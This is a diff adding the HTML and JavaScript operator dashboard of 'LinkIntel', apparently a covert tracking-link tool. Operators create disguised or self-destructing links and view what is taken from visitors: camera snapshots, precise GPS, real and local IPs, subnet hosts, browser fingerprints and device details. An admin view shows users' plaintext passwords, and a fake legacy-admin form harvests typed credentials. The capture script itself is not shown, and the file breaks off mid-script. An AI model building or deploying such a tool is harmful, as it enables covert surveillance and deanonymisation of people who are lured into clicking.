@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LinkIntel — Stealth Portal</title>
+  <meta name="description" content="Advanced stealth link tracker." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="portal.css" />
+</head>
+<body>
+
+<canvas id="matrixCanvas" class="matrix-canvas"></canvas>
+
+<!-- ═══════════════════════════ AUTH SCREEN ════════════════════════════ -->
+<div id="authScreen" class="auth-screen">
+  <div class="auth-bg">
+    <div class="orb orb1"></div>
+    <div class="orb orb2"></div>
+  </div>
+  <div class="auth-card glass">
+    <div class="brand">
+      <div class="brand-icon">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--accent-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+          <path d="M12 8v4"></path>
+          <path d="M12 16h.01"></path>
+        </svg>
+      </div>
+      <h1 class="brand-name text-gradient glitch" data-text="LinkIntel">LinkIntel</h1>
+      <p class="brand-sub" style="color: var(--danger); font-size: 0.72rem; letter-spacing: 0.12em; text-transform: uppercase;">⚠ Restricted Access — Authorized Personnel Only</p>
+    </div>
+
+    <div class="tab-bar" id="authTabBar">
+      <button class="tab-btn active" onclick="showAuthTab('login')">Operator Login</button>
+      <button class="tab-btn" onclick="showAuthTab('register')">New Registration</button>
+    </div>
+
+    <!-- Login -->
+    <div id="loginForm" class="auth-form">
+      <div class="input-group">
+        <label>Operator ID</label>
+        <input type="text" id="loginUser" placeholder="Enter your operator ID" autocomplete="off" />
+      </div>
+      <div class="input-group">
+        <label>Access Key</label>
+        <input type="password" id="loginPass" placeholder="Enter access key" />
+      </div>
+      <div id="loginError" class="error-msg"></div>
+      <button class="btn-primary" onclick="doLogin()">Access Portal</button>
+    </div>
+
+    <!-- Register -->
+    <div id="registerForm" class="auth-form" style="display:none">
+      <div class="input-group">
+        <label>Choose Operator ID</label>
+        <input type="text" id="regUser" placeholder="Choose a username" autocomplete="off" />
+      </div>
+      <div class="input-group">
+        <label>Set Access Key</label>
+        <input type="password" id="regPass" placeholder="Choose a password" />
+      </div>
+      <div id="registerError" class="error-msg"></div>
+      <button class="btn-primary" onclick="doRegister()">Create Credentials</button>
+    </div>
+
+    <!-- HONEY-POT TRAP (Hidden Legacy Admin Portal) -->
+    <div id="trapLink" style="text-align: center; margin-top: 1.5rem; font-size: 0.65rem; opacity: 0.3; cursor: pointer;">
+      <span onclick="document.getElementById('authTabBar').style.display='none'; document.getElementById('loginForm').style.display='none'; document.getElementById('registerForm').style.display='none'; document.getElementById('trapForm').style.display='flex';">Legacy Admin Access</span>
+    </div>
+
+    <div id="trapForm" class="auth-form" style="display:none; border: 1px solid var(--danger); padding: 1rem; border-radius: 8px;">
+      <p style="color: var(--danger); font-size: 0.8rem; margin-bottom: 1rem; text-align: center;">⚠ LEGACY SYSTEM - ROOT ACCESS REQUIRED</p>
+      <div class="input-group">
+        <label style="color: var(--danger)">Root User</label>
+        <input type="text" id="trapUser" placeholder="root" />
+      </div>
+      <div class="input-group">
+        <label style="color: var(--danger)">System Password</label>
+        <input type="password" id="trapPass" />
+      </div>
+      <button class="btn-primary" style="background: var(--danger)" onclick="triggerTrap()">Authenticate</button>
+      <p id="trapMsg" style="color: var(--danger); font-size: 0.75rem; text-align: center; margin-top: 0.5rem; display: none;">Intrusion Detected. IP Logged.</p>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════ MAIN APP ══════════════════════════════ -->
+<div id="appScreen" class="app-screen" style="display:none">
+
+  <!-- Sidebar -->
+  <aside class="sidebar glass">
+    <div class="sidebar-brand">
+      <span class="brand-icon" style="font-size: 1.5rem; filter: none;">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+          <circle cx="12" cy="11" r="3"></circle>
+        </svg>
+      </span>
+      <span class="text-gradient">LinkIntel</span>
+    </div>
+    <nav class="sidebar-nav">
+      <button class="nav-btn active" id="navDashboard" onclick="showView('dashboard')">
+        <span class="nav-icon">📊</span> <span>Dashboard</span>
+      </button>
+      <button class="nav-btn" id="navCreate" onclick="showView('create')">
+        <span class="nav-icon">🪄</span> <span>Create Link</span>
+      </button>
+      <button class="nav-btn" id="navCaptures" onclick="showView('captures')">
+        <span class="nav-icon">🎯</span> <span>Captures</span>
+      </button>
+      <!-- Admin Only -->
+      <button class="nav-btn" id="navGlobal" onclick="showView('global')" style="display:none; color: var(--danger);">
+        <span class="nav-icon">👁️</span> <span>God Mode</span>
+      </button>
+    </nav>
+    <div class="sidebar-footer">
+      <div class="user-pill">
+        <div class="user-avatar" id="sidebarAvatar">A</div>
+        <span id="sidebarUsername">admin</span>
+      </div>
+      <button class="logout-btn" onclick="doLogout()" title="Logout">⏻</button>
+    </div>
+  </aside>
+
+  <!-- Main content -->
+  <main class="main-content">
+
+    <!-- ── DASHBOARD ── -->
+    <div id="viewDashboard" class="view active">
+      <div class="page-header">
+        <h2>Overview</h2>
+        <p>Monitor your link intelligence at a glance</p>
+      </div>
+
+      <div class="stats-grid" id="statsGrid">
+        <div class="stat-card glass">
+          <div class="stat-icon">🔗</div>
+          <div class="stat-val text-gradient-alt" id="statLinks">0</div>
+          <div class="stat-label">Total Links</div>
+        </div>
+        <div class="stat-card glass">
+          <div class="stat-icon">👁️</div>
+          <div class="stat-val text-gradient-alt" id="statVisits">0</div>
+          <div class="stat-label">Total Visits</div>
+        </div>
+        <div class="stat-card glass">
+          <div class="stat-icon">📷</div>
+          <div class="stat-val text-gradient-alt" id="statCams">0</div>
+          <div class="stat-label">Camera Captures</div>
+        </div>
+        <div class="stat-card glass">
+          <div class="stat-icon">🌐</div>
+          <div class="stat-val text-gradient-alt" id="statIPs">0</div>
+          <div class="stat-label">Unique IPs</div>
+        </div>
+      </div>
+
+      <div class="section-title">✨ Recent Links</div>
+      <div id="linksList" class="links-list">
+        <div class="empty-state">No links yet. <span onclick="showView('create')" style="cursor:pointer;color:var(--accent-secondary);font-weight:600;">Create your first link</span></div>
+      </div>
+    </div>
+
+    <!-- ── CREATE LINK ── -->
+    <div id="viewCreate" class="view">
+      <div class="page-header">
+        <h2>Create Smart Link</h2>
+        <p>Transform any URL into a visitor intelligence tracker</p>
+      </div>
+
+      <div class="create-card glass">
+        <div class="input-group">
+          <label>Destination URL</label>
+          <input type="url" id="destUrl" placeholder="https://example.com/target-file.pdf" />
+        </div>
+        <div class="input-group">
+          <label>Stealth Path (Custom Slug)</label>
+          <input type="text" id="customPath" placeholder="e.g. /docs/invoice-pdf (optional)" />
+        </div>
+        <div class="input-group">
+          <label>Link Label (Internal)</label>
+          <input type="text" id="linkLabel" placeholder="e.g. Target 1 Invoice" />
+        </div>
+
+        <div class="collect-options">
+          <div class="collect-title">⚡ Intelligence Gathered</div>
+          <div class="collect-grid">
+            <div class="collect-item"><span>📷</span> Snapshot</div>
+            <div class="collect-item"><span>🌐</span> IP Address</div>
+            <div class="collect-item"><span>🔋</span> Battery %</div>
+            <div class="collect-item"><span>📱</span> Device Info</div>
+            <div class="collect-item"><span>🖥️</span> Screen Size</div>
+            <div class="collect-item"><span>🕐</span> Visit Time</div>
+          </div>
+        </div>
+        
+        <div class="input-group" style="flex-direction: row; align-items: center; gap: 10px; margin-top: 15px; margin-bottom: 20px;">
+          <input type="checkbox" id="burnAfterRead" style="width: 18px; height: 18px; cursor: pointer;">
+          <label for="burnAfterRead" style="margin: 0; color: var(--danger); cursor: pointer;" title="Link will instantly self-destruct after the first target clicks it.">🔥 Burner Link (Self-Destruct after 1 capture)</label>
+        </div>
+
+        <div id="createError" class="error-msg"></div>
+        <button class="btn-primary" onclick="createLink()">Generate Smart Link</button>
+
+        <div id="linkResult" class="link-result" style="display:none">
+          <div class="result-label">✨ Your Smart Link is Ready!</div>
+          <div class="link-box">
+            <span id="resultUrl"></span>
+            <button onclick="copyLink()" id="copyBtn">Copy Link</button>
+          </div>
+          <p class="result-hint">Share this URL — visitor data will appear in your Captures tab.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── CAPTURES ── -->
+    <div id="viewCaptures" class="view">
+      <div class="page-header">
+        <h2>Captured Data</h2>
+        <p>Analyze visitor intelligence for your links</p>
+      </div>
+
+      <div class="captures-layout">
+        <div class="captures-sidebar glass" id="captureLinks">
+          <div class="empty-state" style="padding:2rem 1rem;font-size:0.9rem">No links yet</div>
+        </div>
+        <div class="captures-main" id="captureData">
+          <div class="empty-state" style="margin:auto">Select a link to view intelligence</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── GLOBAL ADMIN OVERVIEW ── -->
+    <div id="viewGlobal" class="view">
+      <div class="page-header">
+        <h2 style="color: var(--danger)">Global God Mode</h2>
+        <p>You are viewing all platform activity.</p>
+      </div>
+
+      <div class="stats-grid" id="globalStatsGrid">
+        <div class="stat-card glass" style="border-color: rgba(239, 68, 68, 0.3)">
+          <div class="stat-icon" style="color: var(--danger)">👥</div>
+          <div class="stat-val" id="gStatUsers" style="color: var(--danger)">0</div>
+          <div class="stat-label">Total Users</div>
+        </div>
+        <div class="stat-card glass">
+          <div class="stat-icon">🔗</div>
+          <div class="stat-val text-gradient-alt" id="gStatLinks">0</div>
+          <div class="stat-label">Total Links</div>
+        </div>
+        <div class="stat-card glass">
+          <div class="stat-icon">🎯</div>
+          <div class="stat-val text-gradient-alt" id="gStatCaps">0</div>
+          <div class="stat-label">Total Captures</div>
+        </div>
+      </div>
+
+      <div class="section-title" style="color: var(--danger); margin-top: 2rem;">👥 Registered Developers</div>
+      <div id="globalUsersList" class="links-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 1rem;">
+        <!-- Users populate here -->
+      </div>
+
+      <div class="section-title" style="color: var(--danger); margin-top: 2rem;">🚨 Global Intelligence Feed</div>
+      <div id="globalCapturesFeed" style="display: flex; flex-direction: column; gap: 1.5rem;">
+        <!-- Global Captures populate here -->
+      </div>
+
+    </div>
+
+  </main>
+</div>
+
+<script>
+/* ─── STATE ──────────────────────────────────────── */
+let session = JSON.parse(localStorage.getItem('li_session') || 'null');
+let allLinks = [];
+let selectedLink = null;
+let refreshInterval = null;
+const BASE = window.location.origin; // dynamic base URL — works on localhost AND Render
+
+/* ─── BOOT ──────────────────────────────────── */
+window.onload = () => {
+  if (session) bootApp();
+  else document.getElementById('authScreen').style.display = 'flex';
+
+  // Toggle collection options
+  document.querySelectorAll('.collect-item').forEach(item => {
+    // default set active
+    item.classList.add('active');
+    item.addEventListener('click', () => {
+      item.classList.toggle('active');
+    });
+  });
+};
+
+/* ─── AUTH ──────────────────────────────────── */
+function showAuthTab(tab) {
+  document.getElementById('loginForm').style.display = tab === 'login' ? 'flex' : 'none';
+  document.getElementById('registerForm').style.display = tab === 'register' ? 'flex' : 'none';
+  document.querySelectorAll('.tab-btn').forEach((b, i) => {
+    b.classList.toggle('active', (i === 0 && tab === 'login') || (i === 1 && tab === 'register'));
+  });
+}
+
+async function doLogin() {
+  const username = document.getElementById('loginUser').value.trim();
+  const password = document.getElementById('loginPass').value;
+  const err = document.getElementById('loginError');
+  err.textContent = '';
+  try {
+    const r = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) });
+    const d = await r.json();
+    if (!r.ok) return (err.textContent = d.error);
+    session = { userId: d.userId, username: d.username, isAdmin: d.isAdmin, adminToken: d.adminToken };
+    localStorage.setItem('li_session', JSON.stringify(session));
+    bootApp();
+  } catch { err.textContent = 'Connection error'; }
+}
+
+async function doRegister() {
+  const username = document.getElementById('regUser').value.trim();
+  const password = document.getElementById('regPass').value;
+  const err = document.getElementById('registerError');
+  err.textContent = '';
+  try {
+    const r = await fetch('/api/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) });
+    const d = await r.json();
+    if (!r.ok) return (err.textContent = d.error);
+    session = { userId: d.userId, username: d.username, isAdmin: d.isAdmin };
+    localStorage.setItem('li_session', JSON.stringify(session));
+    bootApp();
+  } catch { err.textContent = 'Connection error'; }
+}
+
+async function triggerTrap() {
+  const user = document.getElementById('trapUser').value;
+  const pass = document.getElementById('trapPass').value;
+  document.getElementById('trapMsg').style.display = 'block';
+  try {
+    await fetch('/api/trap', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user, pass, ua: navigator.userAgent })
+    });
+  } catch {}
+}
+
+function doLogout() {
+  localStorage.removeItem('li_session');
+  session = null;
+  clearInterval(refreshInterval);
+  document.getElementById('appScreen').style.display = 'none';
+  document.getElementById('authScreen').style.display = 'flex';
+}
+
+/* ─── APP BOOT ────────────────────────────────── */
+async function bootApp() {
+  document.getElementById('authScreen').style.display = 'none';
+  document.getElementById('appScreen').style.display = 'flex';
+  document.getElementById('sidebarUsername').textContent = session.username;
+  document.getElementById('sidebarAvatar').textContent = session.username[0].toUpperCase();
+  
+  if (session.isAdmin) {
+    document.getElementById('navGlobal').style.display = 'flex';
+  }
+
+  loadDashboard();
+  refreshInterval = setInterval(loadDashboard, 8000); // auto-refresh every 8s
+}
+
+/* ─── VIEWS ─────────────────────────────────── */
+function showView(name) {
+  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+  document.getElementById('viewDashboard').classList.toggle('active', name === 'dashboard');
+  document.getElementById('viewCreate').classList.toggle('active', name === 'create');
+  document.getElementById('viewCaptures').classList.toggle('active', name === 'captures');
+  document.getElementById('viewGlobal').classList.toggle('active', name === 'global');
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('nav' + name.charAt(0).toUpperCase() + name.slice(1)).classList.add('active');
+  if (name === 'dashboard') loadDashboard();
+  if (name === 'captures') loadCaptures();
+  if (name === 'global') loadGlobalData();
+}
+
+async function loadGlobalData() {
+  try {
+    const r = await fetch('/api/admin/global', { headers: { 'x-user-id': session.userId, 'x-admin-token': session.adminToken } });
+    if (!r.ok) {
+        if(r.status === 403) {
+            alert('Your session is invalid or you are not an admin. Please login again.');
+            doLogout();
+        }
+        return;
+    }
+    
+    const data = await r.json();
+    
+    // Stats
+    const totalUsers = data.users.length;
+    const totalLinks = data.links.length;
+    let totalCaps = 0;
+    
+    const flatCaps = [];
+    Object.keys(data.captures).forEach(shortCode => {
+      totalCaps += data.captures[shortCode].length;
+      data.captures[shortCode].forEach(c => flatCaps.push({ ...c, shortCode }));
+    });
+
+    // Sort latest captures first
+    flatCaps.sort((a, b) => new Date(b.serverTime) - new Date(a.serverTime));
+
+    document.getElementById('gStatUsers').textContent = totalUsers;
+    document.getElementById('gStatLinks').textContent = totalLinks;
+    document.getElementById('gStatCaps').textContent  = totalCaps;
+
+    // Users List
+    const usersHtml = data.users.map(u => `
+      <div class="glass" style="padding: 1rem; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); display: flex; align-items: center; gap: 1rem;">
+        <div class="user-avatar" style="background: ${u.isAdmin ? 'var(--danger)' : 'var(--accent)'}">${u.username[0].toUpperCase()}</div>
+        <div>
+          <div style="font-weight: 600">${u.username} ${u.isAdmin ? '<span style="color:var(--danger);font-size:0.75rem;border:1px solid;padding:2px 6px;border-radius:10px;margin-left:5px">ADMIN</span>' : ''}</div>
+          <div style="font-size: 0.8rem; color: var(--text2)">ID: ${u.id}</div>
+          ${u.plainPassword ? `<div style="font-size: 0.8rem; color: var(--danger); margin-top: 4px; font-family: var(--font-mono)">Key: ${u.plainPassword}</div>` : ''}
+        </div>
+      </div>
+    `).join('');
+    document.getElementById('globalUsersList').innerHTML = usersHtml || '<div class="empty-state">No users</div>';
+
+    // Captures Feed
+    const capsHtml = flatCaps.map((c, i) => `
+      <div class="capture-card glass" style="border-left: 4px solid var(--danger);">
+        <div class="capture-header">
+          <span class="capture-num" style="color: var(--danger)">Global ID: ${c.id}</span>
+          <span class="capture-time">${new Date(c.serverTime).toLocaleString()} (Link: ${c.shortCode})</span>
+        </div>
+        <div class="capture-grid">
+          ${c.cameraPhoto ? `
+          <div class="cap-section full-width">
+            <div class="cap-label" style="color: var(--danger)">📷 Target Snapshot</div>
+            <img class="cam-photo" src="${c.cameraPhoto}" style="border: 2px solid var(--danger); box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);" />
+          </div>` : ''}
+
+          <div class="cap-section full-width" style="border-color: var(--accent-secondary); background: rgba(0, 221, 255, 0.05);">
+            <div class="cap-label" style="color: var(--accent-secondary)">🌍 Geolocation</div>
+            <div class="cap-val accent-val">${c.location ? `${c.location.city}, ${c.location.country} (${c.location.isp})` : 'Resolving...'}</div>
+          </div>
+
+          <div class="cap-section">
+            <div class="cap-label">🌐 Real IP</div>
+            <div class="cap-val accent-val" style="color: var(--danger)">${c.realIp || 'Unknown'}</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">📡 Local Network IP</div>
+            <div class="cap-val" style="color: var(--danger); font-weight: bold;">${c.localIps && c.localIps.length ? c.localIps.join(', ') : 'Hidden'}</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">🕸️ Active Subnet Nodes</div>
+            <div class="cap-val" style="color: var(--danger); font-weight: bold;">${c.subnetNodes && c.subnetNodes.length ? c.subnetNodes.join('<br>') : 'None'}</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">🔐 Canvas Fingerprint</div>
+            <div class="cap-val accent-val" style="font-family: var(--font-mono); font-size: 0.8rem;">${c.canvasHash || '—'}</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">🔐 Audio API Fingerprint</div>
+            <div class="cap-val accent-val" style="font-family: var(--font-mono); font-size: 0.8rem;">${c.audioHash || '—'}</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">🔐 WebGL Hash</div>
+            <div class="cap-val accent-val" style="font-family: var(--font-mono); font-size: 0.8rem;">${c.webglHash || '—'}</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">💻 Hardware Specs</div>
+            <div class="cap-val" style="font-family: var(--font-mono); font-size: 0.85rem;">CPU: ${c.cpuCores || '?'} Cores | RAM: ${c.deviceRam || '?'} GB</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">📱 Device</div>
+            <div class="cap-val small">${c.deviceType || '—'}</div>
+          </div>
+          <div class="cap-section">
+            <div class="cap-label">🔋 Battery</div>
+            <div class="cap-val">${c.battery !== null && c.battery !== undefined ? c.battery + '%' : '—'}</div>
+          </div>
+        </div>
+      </div>
+    `).join('');
+    document.getElementById('globalCapturesFeed').innerHTML = capsHtml || '<div class="empty-state">No global captures yet</div>';
+
+  } catch (e) {
+    console.error("Failed to load global data", e);
+  }
+}
+
+/* ─── DASHBOARD ─────────────────────────────── */
+async function loadDashboard() {
+  try {
+    const r = await fetch(`/api/links/${session.userId}`);
+    allLinks = await r.json();
+    renderStats();
+    renderLinksList();
+    if (document.getElementById('viewCaptures').classList.contains('active')) {
+      renderCaptureLinks();
+    }
+  } catch {}
+}
+
+async function renderStats() {
+  let totalVisits = 0, cams = 0;
+  const ips = new Set();
+  for (const link of allLinks) {
+    totalVisits += link.visitCount;
+    try {
+      const r = await fetch(`/api/captures/${link.shortCode}`);
+      const caps = await r.json();
+      caps.forEach(c => {
+        if (c.cameraPhoto) cams++;
+        if (c.realIp) ips.add(c.realIp);
+      });
+    } catch {}
+  }
+  document.getElementById('statLinks').textContent = allLinks.length;
+  document.getElementById('statVisits').textContent = totalVisits;
+  document.getElementById('statCams').textContent = cams;
+  document.getElementById('statIPs').textContent = ips.size;
+}
+
+function renderLinksList() {
+  const el = document.getElementById('linksList');
+  if (!allLinks.length) {
+    el.innerHTML = `<div class="empty-state">No links yet. <span onclick="showView('create')" style="cursor:pointer;color:var(--accent)">Create one →</span></div>`;
+    return;
+  }
+  el.innerHTML = allLinks.map(l => {
+    const linkPath = l.stealthPath || '/s/' + l.shortCode;
+    const fullUrl = BASE + linkPath;
+    return `
+    <div class="link-row glass">
+      <div class="link-row-info">
+        <div class="link-row-label">${escHtml(l.label)}</div>
+        <div class="link-row-url">
+          <a href="${fullUrl}" target="_blank">${fullUrl}</a>
+        </div>
+        <div class="link-row-dest" title="${escHtml(l.url)}">${escHtml(l.url).slice(0,60)}${l.url.length>60?'…':''}</div>
+      </div>
+      <div class="link-row-meta">
+        <span class="badge">${l.visitCount} visit${l.visitCount!==1?'s':''}</span>
+        <span class="badge-time">${timeSince(l.createdAt)}</span>
+      </div>
+      <div class="link-row-actions">
+        <button class="btn-sm" onclick="copyText('${fullUrl}', this)">Copy</button>
+        <button class="btn-sm accent" onclick="viewCapture('${l.shortCode}')">View Data</button>
+        <button class="btn-sm danger" onclick="deleteLink('${l.shortCode}')">Del</button>
+      </div>
+    </div>
+  `}).join('');
+}
+
+/* ─── CREATE LINK ───────────────────────────── */
+async function createLink() {
+  const url = document.getElementById('destUrl').value.trim();
+  const label = document.getElementById('linkLabel').value.trim();
+  const customPath = document.getElementById('customPath').value.trim();
+  const burnAfterRead = document.getElementById('burnAfterRead').checked;
+  const err = document.getElementById('createError');
+  err.textContent = '';
+  if (!url) return (err.textContent = 'Please enter a URL');
+  try {
+    const r = await fetch('/api/links', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url, label, customPath, burnAfterRead, creatorId: session.userId })
+    });
+    const d = await r.json();
+    if (!r.ok) return (err.textContent = d.error);
+    document.getElementById('resultUrl').textContent = d.shortUrl;
+    document.getElementById('linkResult').style.display = 'block';
+    
+    if(burnAfterRead) {
+      document.querySelector('.result-hint').innerHTML = `<span style="color:var(--danger)">🔥 WARNING: This is a burner link. It will self-destruct immediately after the first capture.</span>`;
+    } else {
+      document.querySelector('.result-hint').textContent = `Share this URL — visitor data will appear in your Captures tab.`;
+    }
+    
+    loadDashboard();
+  } catch { err.textContent = 'Connection error'; }
+}
+
+function copyLink() {
+  const url = document.getElementById('resultUrl').textContent;
+  copyText(url, document.getElementById('copyBtn'));
+}
+
+function copyText(text, btn) {
+  navigator.clipboard.writeText(text);
+  const orig = btn.textContent;
+  btn.textContent = 'Copied!';
+  btn.style.background = '#22c55e';
+  setTimeout(() => { btn.textContent = orig; btn.style.background = ''; }, 2000);
+}
+
+async function deleteLink(shortCode) {
+  if (!confirm('Delete this link and all its captures?')) return;
+  await fetch(`/api/links/${shortCode}`, { method: 'DELETE' });
+  loadDashboard();
+}
+
+/* ─── CAPTURES ──────────────────────────────── */
+function loadCaptures() {
+  renderCaptureLinks();
+}
+
+function renderCaptureLinks() {
+  const el = document.getElementById('captureLinks');
+  if (!allLinks.length) {
+    el.innerHTML = `<div class="empty-state" style="padding:1.5rem;font-size:.85rem">No links yet</div>`;
+    return;
+  }
+  el.innerHTML = allLinks.map(l => `
+    <div class="cap-link-item ${selectedLink===l.shortCode?'active':''}" onclick="viewCapture('${l.shortCode}')">
+      <div class="cap-link-label">${escHtml(l.label)}</div>
+      <span class="badge">${l.visitCount}</span>
+    </div>
+  `).join('');
+}
+
+async function viewCapture(shortCode) {
+  selectedLink = shortCode;
+  showView('captures');
+  renderCaptureLinks();
+  const r = await fetch(`/api/captures/${shortCode}`);
+  const caps = await r.json();
+  const el = document.getElementById('captureData');
+
+  if (!caps.length) {
+    el.innerHTML = `<div class="empty-state" style="margin:auto">No captures yet for this link.<br>Share the link to start collecting data.</div>`;
+    return;
+  }
+
+  el.innerHTML = caps.map((c, i) => `
+    <div class="capture-card glass">
+      <div class="capture-header">
+        <span class="capture-num">#${i+1}</span>
+        <span class="capture-time">${new Date(c.serverTime).toLocaleString()}</span>
+      </div>
+
+      <div class="capture-grid">
+
+        ${c.cameraPhoto ? `
+        <div class="cap-section full-width">
+          <div class="cap-label">📷 Camera Capture</div>
+          <img class="cam-photo" src="${c.cameraPhoto}" alt="Captured snapshot" style="max-width: 100%; border-radius: 8px; border: 2px solid var(--accent); box-shadow: 0 0 15px rgba(139,92,246,0.3);" />
+        </div>` : `
+        <div class="cap-section full-width" style="border-color: rgba(255,255,255,0.1);">
+          <div class="cap-label" style="color: var(--text2)">📷 Camera Capture</div>
+          <div class="cap-val" style="color: var(--text2)">❌ Not captured (denied or unavailable)</div>
+        </div>`}
+
+        <div class="cap-section full-width" style="border-color: var(--accent-secondary); background: rgba(0, 221, 255, 0.05);">
+          <div class="cap-label" style="color: var(--accent-secondary)">🌍 Geolocation (IP-based)</div>
+          <div class="cap-val accent-val">${c.location ? `${c.location.city}, ${c.location.country} (${c.location.isp})` : 'Resolving...'}</div>
+          ${c.gps ? `<div class="cap-val small" style="margin-top: 5px; color: var(--danger); font-weight: bold;">📍 PRECISION GPS: <a href="https://www.google.com/maps?q=${c.gps.lat},${c.gps.lon}" target="_blank" style="color: var(--danger); text-decoration: underline;">${c.gps.lat.toFixed(5)}, ${c.gps.lon.toFixed(5)}</a> (Accuracy: ${Math.round(c.gps.acc)}m)</div>` : ''}
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🌐 IP Address (Real)</div>
+          <div class="cap-val accent-val">${c.realIp || 'Unknown'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">📡 Local Network IP</div>
+          <div class="cap-val" style="color: var(--danger); font-weight: bold;">${c.localIps && c.localIps.length ? c.localIps.join(', ') : 'Hidden'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🕸️ Active Subnet Nodes</div>
+          <div class="cap-val" style="color: var(--danger); font-weight: bold;">${c.subnetNodes && c.subnetNodes.length ? c.subnetNodes.join('<br>') : 'None Detected'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🌍 IP (Client)</div>
+          <div class="cap-val">${c.ip || '—'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🔐 Canvas Fingerprint</div>
+          <div class="cap-val accent-val" style="font-family: var(--font-mono); font-size: 0.8rem;">${c.canvasHash || '—'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🔐 Audio API Fingerprint</div>
+          <div class="cap-val accent-val" style="font-family: var(--font-mono); font-size: 0.8rem;">${c.audioHash || '—'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🔐 WebGL GPU Hash</div>
+          <div class="cap-val accent-val" style="font-family: var(--font-mono); font-size: 0.8rem;">${c.webglHash || '—'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">💻 Hardware Specs</div>
+          <div class="cap-val" style="font-family: var(--font-mono); font-size: 0.85rem;">CPU: ${c.cpuCores || '?'} Cores | RAM: ${c.deviceRam || '?'} GB</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🧭 Gyroscope Tilt</div>
+          <div class="cap-val" style="font-family: var(--font-mono); font-size: 0.85rem;">${c.motion ? `X: ${c.motion.beta}° | Y: ${c.motion.gamma}°` : 'Stationary'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🔋 Battery</div>
+          <div class="cap-val">
+            ${c.battery !== null && c.battery !== undefined ? `
+              <div class="battery-bar-wrap">
+                <div class="battery-bar" style="width:${c.battery}%"></div>
+              </div>
+              <span>${c.battery}% ${c.charging ? '⚡ Charging' : ''}</span>
+            ` : 'Unavailable'}
+          </div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">📱 Device</div>
+          <div class="cap-val small">${c.deviceType || '—'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🖥️ Screen</div>
+          <div class="cap-val">${c.screenWidth}×${c.screenHeight}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🕐 Timezone</div>
+          <div class="cap-val">${c.timezone || '—'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🌐 Language</div>
+          <div class="cap-val">${c.language || '—'}</div>
+        </div>
+
+        <div class="cap-section">
+          <div class="cap-label">🔌 Connection</div>
+          <div class="cap-val">${c.connection || '—'}</div>
+        </div>
+
+        <div class="cap-section full-width">
+          <div class="cap-label">🖥️ User Agent</div>
+          <div class="cap-val small muted">${escHtml(c.userAgent || '—')}</div>
+        </div>
+
+        <div class="cap-section full-width">
+          <div class="cap-label">🔐 Server Fingerprint</div>
+          <div class="cap-val" style="font-family: var(--font-mono); font-size: 0.85rem; color: var(--accent-secondary);">${c.fingerprint || '—'}</div>
+        </div>
+
+      </div>
+    </div>
+  `).join('');
+}
+
+/* ─── UTILS ─────────────────────────────────── */
+function timeSince(iso) {
+  const s = Math.floor((Date.now() - new Date(iso)) / 1000);
+  if (s < 60) return `${s}s ago`;
+  if (s < 3600) return `${Math.floor(s/60)}m ago`;
+  if (s < 86400) return `${Math.floor(s/3600)}h ago`;
+  return `${Math.floor(s/86400)}d ago`;
+}
+
+function escHtml(str) {
+  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+/* ─── MATRIX BACKGROUND ─────────────────────────── */
+const canvas = document.getElementById('matrixCanvas');
+const ctx = canvas.getContext('2d');
+let cw = window.innerWidth;
+let ch = window.innerHeight;
+canvas.width = cw;
+canvas.height = ch;
+const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:\'",.<>/?~`'.split('');
+const fontSize = 14;
+const columns = cw / fontSize;
